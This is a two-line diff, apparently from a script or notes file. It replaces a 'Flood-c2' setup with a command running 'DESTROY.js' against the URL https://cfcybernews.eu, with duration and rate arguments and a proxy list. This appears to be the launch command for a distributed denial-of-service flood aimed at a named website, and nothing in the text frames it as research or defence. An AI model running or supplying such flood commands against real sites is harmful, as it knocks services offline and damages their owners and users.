@@ -1,2 +1,1 @@
-node l.js web 60 1000 1000 proxy.txt
-cd Flood-c2
+node DESTROY.js https://cfcybernews.eu 60 1000 1000 proxy.txt
